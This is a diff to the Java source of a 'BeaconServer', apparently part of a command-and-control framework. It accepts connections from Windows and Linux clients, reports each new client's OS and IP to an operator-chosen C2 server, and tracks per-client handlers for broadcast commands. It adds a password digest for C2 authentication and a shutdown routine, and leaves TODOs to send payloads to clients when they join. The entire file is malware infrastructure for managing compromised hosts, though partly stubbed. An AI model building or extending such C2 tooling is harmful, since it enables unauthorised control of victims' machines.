@@ -2,19 +2,23 @@ package Servers.Beacon;
 
 import java.util.Scanner;
 import Servers.Duplexer;
-
 import java.io.IOException;
 import java.net.ServerSocket;
 import java.net.Socket;
 import java.util.ArrayList;
 import java.util.HashMap;
+import java.security.MessageDigest;
+import java.nio.charset.StandardCharsets;
 
 public class BeaconServer implements Runnable{
-    // Dictionaries to Map IP's to Duplexer Pointers, and IP's to Responses from individual clients
-    private HashMap<String,Duplexer> windowsClients;
+    // Dictionaries to Map IP's to Client responses
     private HashMap<String,ArrayList<String>> windowsClientResponses;
-    private HashMap<String,Duplexer> linuxClients;
     private HashMap<String,ArrayList<String>> linuxClientResponses;
+
+    // Dictionary to Map IP's to Objects that handle them
+    private HashMap<String,BeaconClientHandler> windowsClientObjects;
+    private HashMap<String,BeaconClientHandler> linuxClientObjects;
+    
 
     // Pointer to the Thread responsible for interacting with the C2 Server
     private BeaconC2Handler C2Handler;
@@ -27,15 +31,37 @@ public class BeaconServer implements Runnable{
      * back to the C2 Server.
      * 
      * @param C2ServerIPAddress IP Address of the C2 Server
+     * @param passwordDigest SHA-256 Digest of the Password entered by the user setting up this Beacon
      * @throws IOException
      */
-    public BeaconServer(String C2ServerIPAddress) throws IOException{
-        this.windowsClients = new HashMap<>();
+    public BeaconServer(String C2ServerIPAddress, String passwordDigest) throws IOException{
         this.windowsClientResponses = new HashMap<>();
-        this.linuxClients = new HashMap<>();
         this.linuxClientResponses = new HashMap<>();
-        this.C2Handler = new BeaconC2Handler(this, C2ServerIPAddress);
+        this.windowsClientObjects = new HashMap<>();
+        this.linuxClientObjects = new HashMap<>();
+
+        this.C2Handler = new BeaconC2Handler(this, C2ServerIPAddress, passwordDigest);
         this.serverSocket = new ServerSocket(80);
+    }
+
+    /**
+     * This function is used to shut down the Beacon Server. 
+     * The Beacon server will distribute this message accordingly, to ensure that all
+     * connections are shut down gracefully
+     * 
+     * @param reason
+     * @throws IOException
+     */
+    protected void quit(String reason) throws IOException{
+        serverSocket.close();
+        for(BeaconClientHandler clientHandler : windowsClientObjects.values()){
+            clientHandler.quit(reason);
+        }
+        for(BeaconClientHandler clientHandler : linuxClientObjects.values()){
+            clientHandler.quit(reason);
+        }
+
+        System.out.println("Beacon Server is shutting down. Reason: " + reason);
     }
 
     /**
@@ -45,7 +71,7 @@ public class BeaconServer implements Runnable{
      * @param Response The Response sent from the client
      */
     protected void addDataToResponsesDictionaries(String IPAddress, String Response){
-        if(windowsClients.keySet().contains(IPAddress)){
+        if(windowsClientObjects.keySet().contains(IPAddress)){
             windowsClientResponses.get(IPAddress).add(Response);
         } else {
             linuxClientResponses.get(IPAddress).add(Response);
@@ -59,7 +85,7 @@ public class BeaconServer implements Runnable{
      * @return ArrayList of all of the responses from the desired client
      */
     protected ArrayList<String> getSingleClientResponses(String IPAddress){
-        if(windowsClients.keySet().contains(IPAddress)){
+        if(windowsClientObjects.keySet().contains(IPAddress)){
             return windowsClientResponses.get(IPAddress);
         } else {
             return linuxClientResponses.get(IPAddress);
@@ -96,21 +122,21 @@ public class BeaconServer implements Runnable{
 
         // Send Status messages based on the Scope of the request
         if(Scope.equals("Windows") || Scope.equals("All")){
-            for(Duplexer clientDuplexer : windowsClients.values()){
-                clientDuplexer.send("TODO: Figure out how we want to check the status of a client");
+            for(BeaconClientHandler clientHandler : windowsClientObjects.values()){
+                clientHandler.sendToClient("TODO: Figure out how we want to check the status of a client");
             }
         }
         if(Scope.equals("Linux") || Scope.equals("All")){
-            for(Duplexer clientDuplexer : linuxClients.values()){
-                clientDuplexer.send("TODO: Figure out how we want to check the status of a client");
+            for(BeaconClientHandler clientHandler : linuxClientObjects.values()){
+                clientHandler.sendToClient("TODO: Figure out how we want to check the status of a client");
             }
         }
         // If the Scope contains a . (i.e. the Scope is an IP Address)
         if(Scope.contains(".")){
-            if(windowsClients.keySet().contains(Scope)){
-                windowsClients.get(Scope).send("TODO: Figure out how we want to check the status of a client");
-            } else if(linuxClients.keySet().contains(Scope)){
-                linuxClients.get(Scope).send("TODO: Figure out how we want to check the status of a client");
+            if(windowsClientObjects.keySet().contains(Scope)){
+                windowsClientObjects.get(Scope).sendToClient("TODO: Figure out how we want to check the status of a client");
+            } else if(linuxClientObjects.keySet().contains(Scope)){
+                linuxClientObjects.get(Scope).sendToClient("TODO: Figure out how we want to check the status of a client");
             }
         }
         
@@ -146,14 +172,14 @@ public class BeaconServer implements Runnable{
         }
         // If the Scope contains a . (i.e. the Scope is an IP Address)
         if(Scope.contains(".")){
-            if(windowsClients.keySet().contains(Scope)){
+            if(windowsClientObjects.keySet().contains(Scope)){
                 if(windowsClientResponses.get(Scope).contains("TODO Figure out how we want to check the status of a client")){
                     clientStatus.put(Scope, true);
                     windowsClientResponses.get(Scope).remove("TODO Figure out how we want to check the status of a client");
                 } else {
                     clientStatus.put(Scope, false);
                 }
-            } else if(linuxClients.keySet().contains(Scope)){
+            } else if(linuxClientObjects.keySet().contains(Scope)){
                 if(linuxClientResponses.get(Scope).contains("TODO Figure out how we want to check the status of a client")){
                     clientStatus.put(Scope, true);
                     linuxClientResponses.get(Scope).remove("TODO Figure out how we want to check the status of a client");
@@ -178,17 +204,18 @@ public class BeaconServer implements Runnable{
                 Duplexer duplexer = new Duplexer(socket);
                 // Get clients IP Address
                 String IPAddress = socket.getRemoteSocketAddress().toString();
-                // Add to client list
                 String OSMessage = duplexer.receive();
                 // Send message to C2 announcing that a new client has been obtained
                 C2Handler.sendDataToC2Server("New " + OSMessage + " Client at " + IPAddress);
-
+                // Create new Beacon Client Handler Thread to handle this connection between the Beacon and the client
+                BeaconClientHandler clientHandler = new BeaconClientHandler(IPAddress, duplexer, this);
+                // Add to client lists
                 if(OSMessage.equals("Windows")){
-                    windowsClients.put(IPAddress,duplexer);
+                    windowsClientObjects.put(IPAddress,clientHandler);
                     windowsClientResponses.put(IPAddress, new ArrayList<String>());
                     // TODO: Send Payload back on the client's initial join
                 }else if(OSMessage.equals("Linux")){
-                    linuxClients.put(IPAddress,duplexer);
+                    linuxClientObjects.put(IPAddress,clientHandler);
                     linuxClientResponses.put(IPAddress, new ArrayList<String>());
                     // TODO: Send Payload back on the client's initial join
                 }
@@ -200,11 +227,31 @@ public class BeaconServer implements Runnable{
     }
 
     public static void main(String[] args){
+        // Have the user enter in the IP Address to connect to
         Scanner userScanner = new Scanner(System.in);
         System.out.print("Enter C2 Server IP Address: ");
         String C2ServerIPAddress = userScanner.next();
+        // Have the user enter in the password
+        System.out.print("Enter Password: ");
+        String password = userScanner.next();
+        // Hash the Password
+        String passwordDigest = "";
         try{
-            BeaconServer beaconServer = new BeaconServer(C2ServerIPAddress);
+            MessageDigest digest = MessageDigest.getInstance("SHA-256");
+            byte[] encodedhash = digest.digest(password.getBytes(StandardCharsets.UTF_8));
+            StringBuilder hexString = new StringBuilder(2 * encodedhash.length);
+            for (int i = 0; i < encodedhash.length; i++) {
+                String hex = Integer.toHexString(0xff & encodedhash[i]);
+                if(hex.length() == 1) {
+                    hexString.append('0');
+                }
+                hexString.append(hex);
+            }
+            passwordDigest = hexString.toString();
+        } catch(Exception e){}
+        
+        try{
+            BeaconServer beaconServer = new BeaconServer(C2ServerIPAddress, passwordDigest);
             beaconServer.run();
         } catch(IOException e){
             e.printStackTrace();
